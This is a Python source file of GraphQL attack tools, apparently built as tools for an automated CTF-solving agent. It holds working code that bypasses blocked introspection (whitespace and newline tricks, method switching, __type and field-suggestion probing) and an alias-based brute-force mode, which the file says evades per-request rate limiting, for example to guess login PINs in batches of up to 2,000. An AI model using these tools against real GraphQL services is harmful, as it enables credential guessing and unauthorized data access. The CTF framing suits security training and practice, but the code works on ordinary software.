"""
GraphQL testing tools for CTF solving.

Provides GraphQL introspection, arbitrary query execution, and alias-based
brute-force capabilities (corCTF 2023 "force" technique).
"""

import json
import re
from typing import Any, Dict, List, Optional, Set

import requests

# Built-in GraphQL types to filter out of custom type listings
_BUILTIN_TYPES: Set[str] = {
    "__Schema",
    "__Type",
    "__Field",
    "__InputValue",
    "__EnumValue",
    "__Directive",
    "__DirectiveLocation",
    "String",
    "Int",
    "Float",
    "Boolean",
    "ID",
}

# Type names that are interesting for CTF challenges
_INTERESTING_TYPE_NAMES: Set[str] = {
    "user",
    "admin",
    "flag",
    "secret",
    "password",
    "token",
    "key",
    "credential",
    "config",
}

# Common CTF flag patterns
_FLAG_PATTERNS: List[str] = [
    r"(picoCTF\{[^}]+\})",
    r"(picoctf\{[^}]+\})",
    r"(HTB\{[^}]+\})",
    r"(htb\{[^}]+\})",
    r"(THM\{[^}]+\})",
    r"(thm\{[^}]+\})",
    r"(FLAG\{[^}]+\})",
    r"(flag\{[^}]+\})",
    r"(CTF\{[^}]+\})",
    r"(ctf\{[^}]+\})",
]

# Full introspection query
_INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind ofType { name kind } }
        }
        args { name type { name kind ofType { name kind } } }
      }
    }
  }
}"""


class GraphqlIntrospectionTool:
    """
    GraphqlIntrospectionTool: Introspect a GraphQL endpoint to discover
    its schema, types, queries, and mutations.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/graphql",
          "method": "POST",
          "headers": {},
          "timeout": 15
        }

    Behavior:
      - Sends a full introspection query to the GraphQL endpoint.
      - If introspection is blocked, tries bypass techniques:
          * Whitespace variations
          * Newline injection after __
          * Switching HTTP method (GET <-> POST)
          * Individual __type queries
          * Field suggestion probing via malformed queries
      - Parses the schema and presents a structured report.
    """

    name: str = "graphql_introspection"
    description: str = (
        "Introspect a GraphQL endpoint to discover its schema, types, queries, "
        "and mutations. Input must be JSON with keys: 'url' (required, the "
        "GraphQL endpoint URL), optional 'method' ('POST' or 'GET', default "
        "'POST'), optional 'headers' (dict), optional 'timeout' (int, default "
        "15). Sends a full introspection query and, if blocked, tries bypass "
        "techniques (whitespace variations, newline injection, method switching, "
        "__type queries, field suggestion probing). Returns a structured report "
        "of Query types, Mutation types, custom types, and interesting findings."
    )

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _send_graphql(
        self,
        url: str,
        query: str,
        method: str,
        headers: Dict[str, str],
        timeout: int,
    ) -> requests.Response:
        """Send a GraphQL query using the specified method."""
        if method == "GET":
            return self.session.get(
                url,
                params={"query": query},
                headers=headers,
                timeout=timeout,
            )
        else:
            return self.session.post(
                url,
                json={"query": query},
                headers=headers,
                timeout=timeout,
            )

    def _is_introspection_success(self, resp: requests.Response) -> bool:
        """Return True if the response contains a valid __schema result."""
        try:
            body = resp.json()
            return (
                isinstance(body, dict)
                and "data" in body
                and body["data"] is not None
                and "__schema" in body["data"]
            )
        except Exception:
            return False

    def _is_type_query_success(self, resp: requests.Response) -> bool:
        """Return True if a __type query returned data."""
        try:
            body = resp.json()
            return (
                isinstance(body, dict)
                and "data" in body
                and body["data"] is not None
                and "__type" in body["data"]
                and body["data"]["__type"] is not None
            )
        except Exception:
            return False

    @staticmethod
    def _resolve_type(type_obj: Optional[Dict]) -> str:
        """Recursively resolve a GraphQL type to a human-readable string."""
        if type_obj is None:
            return "?"
        kind = type_obj.get("kind", "")
        name = type_obj.get("name")
        if name:
            return name
        of_type = type_obj.get("ofType")
        inner = GraphqlIntrospectionTool._resolve_type(of_type)
        if kind == "NON_NULL":
            return f"{inner}!"
        if kind == "LIST":
            return f"[{inner}]"
        return inner or "?"

    def _format_schema(self, schema: Dict) -> str:
        """Parse a full introspection result into a readable report."""
        lines: List[str] = []

        query_type_name = None
        mutation_type_name = None
        subscription_type_name = None

        qt = schema.get("queryType")
        if qt:
            query_type_name = qt.get("name")
        mt = schema.get("mutationType")
        if mt:
            mutation_type_name = mt.get("name")
        st = schema.get("subscriptionType")
        if st:
            subscription_type_name = st.get("name")

        all_types: List[Dict] = schema.get("types") or []

        # Categorise types
        query_fields: List[Dict] = []
        mutation_fields: List[Dict] = []
        subscription_fields: List[Dict] = []
        custom_types: List[Dict] = []
        interesting: List[Dict] = []

        for t in all_types:
            t_name = t.get("name", "")

            # Skip built-ins
            if t_name in _BUILTIN_TYPES or t_name.startswith("__"):
                continue

            # Root operation types
            if t_name == query_type_name:
                query_fields = t.get("fields") or []
                continue
            if t_name == mutation_type_name:
                mutation_fields = t.get("fields") or []
                continue
            if t_name == subscription_type_name:
                subscription_fields = t.get("fields") or []
                continue

            custom_types.append(t)
            if t_name.lower() in _INTERESTING_TYPE_NAMES:
                interesting.append(t)

        # --- Query Types ---
        lines.append("=== QUERY TYPES ===")
        if query_fields:
            for f in query_fields:
                args_str = self._format_args(f.get("args"))
                ret_type = self._resolve_type(f.get("type"))
                lines.append(f"  {f['name']}{args_str}: {ret_type}")
        else:
            lines.append("  (none discovered)")
        lines.append("")

        # --- Mutation Types ---
        lines.append("=== MUTATION TYPES ===")
        if mutation_fields:
            for f in mutation_fields:
                args_str = self._format_args(f.get("args"))
                ret_type = self._resolve_type(f.get("type"))
                lines.append(f"  {f['name']}{args_str}: {ret_type}")
        else:
            lines.append("  (none discovered)")
        lines.append("")

        # --- Subscription Types ---
        if subscription_fields:
            lines.append("=== SUBSCRIPTION TYPES ===")
            for f in subscription_fields:
                args_str = self._format_args(f.get("args"))
                ret_type = self._resolve_type(f.get("type"))
                lines.append(f"  {f['name']}{args_str}: {ret_type}")
            lines.append("")

        # --- Custom Types ---
        lines.append("=== CUSTOM TYPES ===")
        if custom_types:
            for t in custom_types:
                kind = t.get("kind", "?")
                lines.append(f"  {t['name']} ({kind})")
                fields = t.get("fields") or []
                for f in fields:
                    ret_type = self._resolve_type(f.get("type"))
                    lines.append(f"    .{f['name']}: {ret_type}")
        else:
            lines.append("  (none discovered)")
        lines.append("")

        # --- Interesting Findings ---
        lines.append("=== INTERESTING FINDINGS ===")
        if interesting:
            for t in interesting:
                lines.append(f"  ** {t['name']} ** (may contain sensitive data)")
                fields = t.get("fields") or []
                for f in fields:
                    ret_type = self._resolve_type(f.get("type"))
                    lines.append(f"    .{f['name']}: {ret_type}")
        else:
            lines.append("  No obviously interesting types found.")
        lines.append("")

        return "\n".join(lines)

    @staticmethod
    def _format_args(args: Optional[List[Dict]]) -> str:
        """Format a list of GraphQL field arguments."""
        if not args:
            return ""
        parts = []
        for a in args:
            a_type = GraphqlIntrospectionTool._resolve_type(a.get("type"))
            parts.append(f"{a['name']}: {a_type}")
        return "(" + ", ".join(parts) + ")"

    def _extract_suggestions(self, text: str) -> List[str]:
        """Extract field name suggestions from GraphQL error messages."""
        # Common pattern: "Did you mean ..." or suggestions in quotes
        suggestions: List[str] = []
        patterns = [
            r'Did you mean ["\']?(\w+)["\']?',
            r'Cannot query field ["\'](\w+)["\']',
            r'suggestions?[:\s]+["\'](\w+)["\']',
        ]
        for pat in patterns:
            for m in re.finditer(pat, text, re.IGNORECASE):
                name = m.group(1)
                if name not in suggestions:
                    suggestions.append(name)
        # Also grab any quoted words from the error
        for m in re.finditer(r'"(\w+)"', text):
            name = m.group(1)
            if name not in suggestions and name not in (
                "query",
                "mutation",
                "message",
                "errors",
                "data",
            ):
                suggestions.append(name)
        return suggestions

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------

    def use(self, tool_input: str) -> str:  # noqa: C901 (complexity is inherent)
        # --- Parse input ---
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return (
                f"[GraphqlIntrospectionTool] Error: tool_input must be JSON. "
                f"Decoding failed with: {exc}"
            )

        url = data.get("url")
        if not url or not isinstance(url, str):
            return (
                "[GraphqlIntrospectionTool] Error: 'url' (string) is required "
                "in the input JSON."
            )

        method = (data.get("method") or "POST").upper()
        if method not in ("GET", "POST"):
            return "[GraphqlIntrospectionTool] Error: 'method' must be 'GET' or 'POST'."

        headers = data.get("headers") or {}
        if not isinstance(headers, dict):
            return "[GraphqlIntrospectionTool] Error: 'headers' must be a dict."

        timeout = data.get("timeout", 15)
        try:
            timeout = int(timeout)
        except (ValueError, TypeError):
            timeout = 15

        # ----------------------------------------------------------
        # Attempt 1: full introspection query with the given method
        # ----------------------------------------------------------
        bypass_log: List[str] = []

        try:
            resp = self._send_graphql(
                url, _INTROSPECTION_QUERY, method, headers, timeout
            )
        except Exception as exc:
            return (
                f"[GraphqlIntrospectionTool] Error sending introspection query "
                f"to {url!r}: {exc!r}"
            )

        if self._is_introspection_success(resp):
            schema = resp.json()["data"]["__schema"]
            report = self._format_schema(schema)
            return (
                f"[GraphqlIntrospectionTool] Introspection Successful\n"
                f"{'=' * 50}\n"
                f"Endpoint: {url}\n"
                f"Method: {method}\n\n"
                f"{report}"
            )

        # Introspection blocked -- start bypass attempts
        bypass_log.append(
            f"Standard introspection ({method}): BLOCKED "
            f"(status {resp.status_code})"
        )

        # ----------------------------------------------------------
        # Attempt 2: whitespace-compact introspection
        # ----------------------------------------------------------
        compact_query = "{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"
        try:
            resp = self._send_graphql(url, compact_query, method, headers, timeout)
            if self._is_introspection_success(resp):
                schema = resp.json()["data"]["__schema"]
                report = self._format_schema(schema)
                return (
                    f"[GraphqlIntrospectionTool] Introspection Successful (compact bypass)\n"
                    f"{'=' * 50}\n"
                    f"Endpoint: {url}\n"
                    f"Method: {method}\n\n"
                    f"{report}"
                )
            bypass_log.append("Compact whitespace query: BLOCKED")
        except Exception as exc:
            bypass_log.append(f"Compact whitespace query: ERROR ({exc})")

        # ----------------------------------------------------------
        # Attempt 3: newline after __ (e.g. {__\nschema{types{name}}})
        # ----------------------------------------------------------
        newline_query = "{__\nschema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"
        try:
            resp = self._send_graphql(url, newline_query, method, headers, timeout)
            if self._is_introspection_success(resp):
                schema = resp.json()["data"]["__schema"]
                report = self._format_schema(schema)
                return (
                    f"[GraphqlIntrospectionTool] Introspection Successful (newline bypass)\n"
                    f"{'=' * 50}\n"
                    f"Endpoint: {url}\n"
                    f"Method: {method}\n\n"
                    f"{report}"
                )
            bypass_log.append("Newline-after-__ query: BLOCKED")
        except Exception as exc:
            bypass_log.append(f"Newline-after-__ query: ERROR ({exc})")

        # ----------------------------------------------------------
        # Attempt 4: alternate HTTP method (GET <-> POST)
        # ----------------------------------------------------------
        alt_method = "GET" if method == "POST" else "POST"
        try:
            resp = self._send_graphql(
                url, _INTROSPECTION_QUERY, alt_method, headers, timeout
            )
            if self._is_introspection_success(resp):
                schema = resp.json()["data"]["__schema"]
                report = self._format_schema(schema)
                return (
                    f"[GraphqlIntrospectionTool] Introspection Successful "
                    f"(method switch to {alt_method})\n"
                    f"{'=' * 50}\n"
                    f"Endpoint: {url}\n"
                    f"Method: {alt_method}\n\n"
                    f"{report}"
                )
            bypass_log.append(f"Alternate method ({alt_method}): BLOCKED")
        except Exception as exc:
            bypass_log.append(f"Alternate method ({alt_method}): ERROR ({exc})")

        # ----------------------------------------------------------
        # Attempt 5: __type queries for common root type names
        # ----------------------------------------------------------
        discovered_types: Dict[str, Dict] = {}
        probe_names = [
            "Query",
            "Mutation",
            "Subscription",
            "User",
            "Admin",
            "Flag",
            "Secret",
            "Token",
            "Config",
        ]
        for probe_name in probe_names:
            type_query = (
                f'{{ __type(name: "{probe_name}") {{ '
                f"name kind fields {{ name type {{ name kind ofType {{ name kind }} }} "
                f"args {{ name type {{ name kind ofType {{ name kind }} }} }} }} "
                f"}} }}"
            )
            try:
                resp = self._send_graphql(url, type_query, method, headers, timeout)
                if self._is_type_query_success(resp):
                    t = resp.json()["data"]["__type"]
                    discovered_types[t["name"]] = t
            except Exception:
                pass

        if discovered_types:
            bypass_log.append(
                f"__type probes: Discovered {len(discovered_types)} type(s): "
                + ", ".join(sorted(discovered_types))
            )
        else:
            bypass_log.append("__type probes: no types discovered")

        # ----------------------------------------------------------
        # Attempt 6: field suggestion probing
        # ----------------------------------------------------------
        suggestion_fields: List[str] = []
        probe_query = "{ __nonexistent_field_xyzzy }"
        try:
            resp = self._send_graphql(url, probe_query, method, headers, timeout)
            text = resp.text
            suggestion_fields = self._extract_suggestions(text)
            if suggestion_fields:
                bypass_log.append(
                    "Field suggestion probe: found suggestions: "
                    + ", ".join(suggestion_fields)
                )
            else:
                bypass_log.append("Field suggestion probe: no suggestions returned")
        except Exception as exc:
            bypass_log.append(f"Field suggestion probe: ERROR ({exc})")

        # ----------------------------------------------------------
        # Build final report from whatever was gathered
        # ----------------------------------------------------------
        lines: List[str] = [
            "[GraphqlIntrospectionTool] Introspection Blocked",
            "=" * 50,
            f"Endpoint: {url}",
            f"Method: {method}",
            "",
            "--- BYPASS ATTEMPTS ---",
        ]
        for entry in bypass_log:
            lines.append(f"  {entry}")
        lines.append("")

        # Report discovered types from __type probes
        if discovered_types:
            lines.append("--- DISCOVERED TYPES (from __type probes) ---")
            for t_name, t_data in sorted(discovered_types.items()):
                kind = t_data.get("kind", "?")
                lines.append(f"  {t_name} ({kind})")
                fields = t_data.get("fields") or []
                for f in fields:
                    ret_type = self._resolve_type(f.get("type"))
                    args_str = self._format_args(f.get("args"))
                    lines.append(f"    .{f['name']}{args_str}: {ret_type}")

                # Highlight interesting
                if t_name.lower() in _INTERESTING_TYPE_NAMES:
                    lines.append(
                        f"    ** INTERESTING: {t_name} may contain sensitive data **"
                    )
            lines.append("")

        # Report field suggestions
        if suggestion_fields:
            lines.append("--- FIELD SUGGESTIONS ---")
            for sf in suggestion_fields:
                lines.append(f"  {sf}")
            lines.append("")

        # Recommendations
        lines.append("--- RECOMMENDATIONS ---")
        if discovered_types:
            lines.append(
                "  - Use graphql_query to query discovered types/fields directly."
            )
        if suggestion_fields:
            lines.append(
                "  - Try querying the suggested field names with graphql_query."
            )
        if not discovered_types and not suggestion_fields:
            lines.append("  - Introspection fully blocked and no type info recovered.")
            lines.append(
                "  - Try guessing common query names (users, flag, me, login) "
                "with graphql_query."
            )
            lines.append(
                "  - Check for alternative endpoints (/graphql, /api, /gql, /v1/graphql)."
            )
        lines.append("")

        return "\n".join(lines)


class GraphqlQueryTool:
    """
    GraphqlQueryTool: Send arbitrary GraphQL queries to an endpoint.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/graphql",
          "query": "{ users { id name } }",
          "variables": {},
          "operation_name": null,
          "headers": {},
          "method": "POST",
          "batch": false,
          "batch_count": 1,
          "timeout": 15
        }

    Behavior:
      - Sends the GraphQL query to the endpoint.
      - POST: JSON body {"query": ..., "variables": ..., "operationName": ...}
      - GET: query params ?query=...&variables=...
      - Batch mode: wraps in array [{"query": ...}, {"query": ...}, ...]
      - Parses and displays the response with data, errors, and flag detection.
    """

    name: str = "graphql_query"
    description: str = (
        "Send a GraphQL query to an endpoint and display the results. "
        "Input must be JSON with keys: 'url' (required, GraphQL endpoint URL), "
        "'query' (required unless using alias_bruteforce, GraphQL query string), "
        "optional 'variables' (dict), optional 'operation_name' (string), optional "
        "'headers' (dict), optional 'method' ('POST' or 'GET', default 'POST'), "
        "optional 'batch' (bool, send as batched query array, default false), optional "
        "'batch_count' (int, number of copies for batching, default 1), "
        "optional 'timeout' (int, default 15). "
        "NEW: 'alias_bruteforce' (dict) for alias-based brute-force. Keys: "
        "'query_template' (e.g., 'login(pin: \"{value}\") {{ token }}'), "
        "'values' (list of values to try) OR 'range' ([start, end] for numeric range), "
        "'batch_size' (int, aliases per request, default 500). "
        "Bypasses per-request rate limiting by sending many queries as aliases."
    )

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_flags(text: str) -> List[str]:
        """Search for CTF flag patterns in a text string."""
        flags: List[str] = []
        for pattern in _FLAG_PATTERNS:
            for m in re.finditer(pattern, text):
                flag = m.group(1)
                if flag not in flags:
                    flags.append(flag)
        return flags

    @staticmethod
    def _format_value(value: Any, indent: int = 2) -> str:
        """Pretty-format a JSON value for display."""
        try:
            return json.dumps(value, indent=indent, ensure_ascii=False)
        except (TypeError, ValueError):
            return str(value)

    # ------------------------------------------------------------------
    # Alias brute-force (corCTF 2023 "force" technique)
    # ------------------------------------------------------------------

    def _alias_bruteforce(
        self,
        url: str,
        query_template: str,
        values: List[str],
        batch_size: int,
        headers: Dict[str, str],
        timeout: int,
    ) -> str:
        """
        Send many GraphQL queries as aliases in a single request.

        Example: query_template = 'login(pin: "{value}") { token }'
        Values = ["0000", "0001", ...]
        Produces: { a0: login(pin: "0000") { token }  a1: login(pin: "0001") { token } ... }
        """
        lines: List[str] = [
            "[GraphqlQueryTool] Alias Brute-Force Results",
            "=" * 50,
            f"Endpoint: {url}",
            f"Template: {query_template}",
            f"Total values: {len(values)}",
            f"Batch size: {batch_size}",
            "",
        ]

        all_flags: List[str] = []
        interesting_results: List[Dict[str, Any]] = []
        batch_num = 0

        for i in range(0, len(values), batch_size):
            batch_num += 1
            batch_values = values[i : i + batch_size]

            # Build aliased query
            alias_parts = []
            for j, val in enumerate(batch_values):
                alias = f"a{i + j}"
                # Replace {value} placeholder in template
                resolved = query_template.replace("{value}", str(val))
                alias_parts.append(f"{alias}: {resolved}")

            query = "{ " + " ".join(alias_parts) + " }"

            try:
                resp = self.session.post(
                    url,
                    json={"query": query},
                    headers=headers,
                    timeout=timeout,
                )
                raw_text = resp.text

                # Check for flags in response
                batch_flags = self._extract_flags(raw_text)
                all_flags.extend(batch_flags)

                # Parse response
                try:
                    body = resp.json()
                    resp_data = body.get("data") or {}
                    resp_errors = body.get("errors")

                    # Check each alias for non-null/non-error results
                    for j, val in enumerate(batch_values):
                        alias = f"a{i + j}"
                        result = resp_data.get(alias)
                        if result is not None and result != {} and result != []:
                            interesting_results.append(
                                {
                                    "value": val,
                                    "alias": alias,
                                    "result": result,
                                }
                            )

                    if resp_errors:
                        lines.append(
                            f"Batch {batch_num} ({len(batch_values)} aliases): "
                            f"{len([r for r in resp_data.values() if r])} hits, "
                            f"{len(resp_errors)} errors"
                        )
                    else:
                        hits = len([r for r in resp_data.values() if r])
                        lines.append(
                            f"Batch {batch_num} ({len(batch_values)} aliases): "
                            f"{hits} hits"
                        )

                except (json.JSONDecodeError, ValueError):
                    lines.append(
                        f"Batch {batch_num}: non-JSON response "
                        f"(status {resp.status_code})"
                    )

            except Exception as exc:
                lines.append(f"Batch {batch_num}: ERROR - {exc}")

        lines.append("")

        # Report flags
        if all_flags:
            unique_flags = list(dict.fromkeys(all_flags))
            lines.append("!!! FLAGS FOUND !!!")
            for f in unique_flags:
                lines.append(f"  {f}")
            lines.append("")

        # Report interesting results
        if interesting_results:
            lines.append(f"INTERESTING RESULTS ({len(interesting_results)}):")
            for r in interesting_results[:20]:  # Cap display
                lines.append(
                    f"  Value: {r['value']} -> {json.dumps(r['result'])[:300]}"
                )
            if len(interesting_results) > 20:
                lines.append(f"  ... and {len(interesting_results) - 20} more")
            lines.append("")
        else:
            lines.append("No interesting results found.")
            lines.append("")

        lines.append(f"Total batches sent: {batch_num}")
        lines.append(f"Total values tested: {len(values)}")

        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------

    def use(self, tool_input: str) -> str:
        # --- Parse input ---
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return (
                f"[GraphqlQueryTool] Error: tool_input must be JSON. "
                f"Decoding failed with: {exc}"
            )

        url = data.get("url")
        if not url or not isinstance(url, str):
            return (
                "[GraphqlQueryTool] Error: 'url' (string) is required "
                "in the input JSON."
            )

        # --- Check for alias brute-force mode ---
        alias_bf = data.get("alias_bruteforce")
        if alias_bf and isinstance(alias_bf, dict):
            query_template = alias_bf.get("query_template", "")
            if not query_template:
                return (
                    "[GraphqlQueryTool] Error: alias_bruteforce.query_template "
                    "is required."
                )
            values = alias_bf.get("values") or []
            value_range = alias_bf.get("range")
            if value_range and isinstance(value_range, list) and len(value_range) == 2:
                start, end = int(value_range[0]), int(value_range[1])
                # Generate zero-padded values if template suggests PIN/code
                width = len(str(end - 1))
                values = [str(v).zfill(width) for v in range(start, end)]
            if not values:
                return (
                    "[GraphqlQueryTool] Error: alias_bruteforce requires "
                    "'values' (list) or 'range' ([start, end])."
                )
            batch_size = alias_bf.get("batch_size", 500)
            try:
                batch_size = max(1, min(int(batch_size), 2000))
            except (ValueError, TypeError):
                batch_size = 500
            headers = data.get("headers") or {}
            timeout = data.get("timeout", 30)
            try:
                timeout = int(timeout)
            except (ValueError, TypeError):
                timeout = 30
            return self._alias_bruteforce(
                url, query_template, values, batch_size, headers, timeout
            )

        query = data.get("query")
        if not query or not isinstance(query, str):
            return (
                "[GraphqlQueryTool] Error: 'query' (string) is required "
                "in the input JSON."
            )

        variables = data.get("variables") or {}
        operation_name = data.get("operation_name")
        headers = data.get("headers") or {}
        method = (data.get("method") or "POST").upper()
        batch = data.get("batch", False)
        batch_count = data.get("batch_count", 1)
        timeout = data.get("timeout", 15)

        if not isinstance(headers, dict):
            return "[GraphqlQueryTool] Error: 'headers' must be a dict."
        if not isinstance(variables, dict):
            return "[GraphqlQueryTool] Error: 'variables' must be a dict."
        if method not in ("GET", "POST"):
            return "[GraphqlQueryTool] Error: 'method' must be 'GET' or 'POST'."

        try:
            timeout = int(timeout)
        except (ValueError, TypeError):
            timeout = 15

        try:
            batch_count = max(1, int(batch_count))
        except (ValueError, TypeError):
            batch_count = 1

        # --- Build payload ---
        payload: Dict[str, Any] = {"query": query}
        if variables:
            payload["variables"] = variables
        if operation_name:
            payload["operationName"] = operation_name

        # --- Send request ---
        try:
            if method == "GET":
                params: Dict[str, str] = {"query": query}
                if variables:
                    params["variables"] = json.dumps(variables)
                if operation_name:
                    params["operationName"] = operation_name
                resp = self.session.get(
                    url,
                    params=params,
                    headers=headers,
                    timeout=timeout,
                )
            else:  # POST
                if batch:
                    batch_payload = [dict(payload) for _ in range(batch_count)]
                    resp = self.session.post(
                        url,
                        json=batch_payload,
                        headers=headers,
                        timeout=timeout,
                    )
                else:
                    resp = self.session.post(
                        url,
                        json=payload,
                        headers=headers,
                        timeout=timeout,
                    )
        except Exception as exc:
            return f"[GraphqlQueryTool] Error sending query to {url!r}: {exc!r}"

        # --- Parse response ---
        raw_text = resp.text or ""
        lines: List[str] = [
            "[GraphqlQueryTool] Query Result",
            "=" * 50,
            f"Endpoint: {url}",
            f"Method: {method}",
            f"Status: {resp.status_code}",
            "",
        ]

        # Try to parse as JSON
        try:
            body = resp.json()
        except (json.JSONDecodeError, ValueError):
            # Not a JSON response -- may not be a GraphQL endpoint
            lines.append("--- RAW RESPONSE (not valid JSON) ---")
            truncated = raw_text[:4000]
            lines.append(truncated)
            if len(raw_text) > 4000:
                lines.append("...[truncated]...")
            lines.append("")

            # Still scan for flags
            flags = self._extract_flags(raw_text)
            if flags:
                lines.append("--- FLAGS FOUND ---")
                for f in flags:
                    lines.append(f"  {f}")
                lines.append("")

            lines.append(
                "NOTE: The response is not valid JSON. The endpoint may not "
                "be a GraphQL API or may require different headers/content type."
            )
            return "\n".join(lines)

        # Handle batched response (list of results)
        if isinstance(body, list):
            lines.append(f"--- BATCHED RESPONSE ({len(body)} results) ---")
            all_flags: List[str] = []
            for idx, item in enumerate(body):
                lines.append(f"\n  [Result {idx}]")
                if isinstance(item, dict):
                    resp_data = item.get("data")
                    resp_errors = item.get("errors")
                    if resp_data is not None:
                        lines.append(f"  Data: {self._format_value(resp_data)}")
                    if resp_errors:
                        lines.append(f"  Errors: {self._format_value(resp_errors)}")
                else:
                    lines.append(f"  {self._format_value(item)}")
                item_text = json.dumps(item, ensure_ascii=False)
                all_flags.extend(self._extract_flags(item_text))
            lines.append("")
            if all_flags:
                unique_flags = list(dict.fromkeys(all_flags))
                lines.append("--- FLAGS FOUND ---")
                for f in unique_flags:
                    lines.append(f"  {f}")
                lines.append("")
            return "\n".join(lines)

        # Single response (dict)
        resp_data = body.get("data")
        resp_errors = body.get("errors")

        # --- Response Data ---
        lines.append("--- RESPONSE DATA ---")
        if resp_data is not None:
            lines.append(self._format_value(resp_data))
        else:
            lines.append("  (no data returned)")
        lines.append("")

        # --- Errors ---
        if resp_errors:
            lines.append("--- ERRORS ---")
            if isinstance(resp_errors, list):
                for err in resp_errors:
                    if isinstance(err, dict):
                        msg = err.get("message", str(err))
                        locations = err.get("locations")
                        path = err.get("path")
                        lines.append(f"  Message: {msg}")
                        if locations:
                            lines.append(f"    Locations: {locations}")
                        if path:
                            lines.append(f"    Path: {path}")
                    else:
                        lines.append(f"  {err}")
            else:
                lines.append(f"  {self._format_value(resp_errors)}")
            lines.append("")

        # --- Flag detection ---
        flags = self._extract_flags(raw_text)
        if flags:
            lines.append("--- FLAGS FOUND ---")
            for f in flags:
                lines.append(f"  {f}")
            lines.append("")

        return "\n".join(lines)
